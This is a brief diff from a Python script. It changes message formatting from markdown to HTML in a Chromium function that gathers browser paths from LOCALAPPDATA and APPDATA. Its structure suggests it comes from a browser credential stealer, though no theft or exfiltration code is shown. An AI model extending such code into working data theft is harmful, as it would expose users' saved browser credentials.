@@ -317,7 +317,7 @@ def Chromium():
     global msgInfo
 
     Log("===========Chromium===========")
-    msgInfo+="\n**🌐Browsers🌐**"
+    msgInfo+="\n<b>🌐Browsers🌐</b>"
 
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
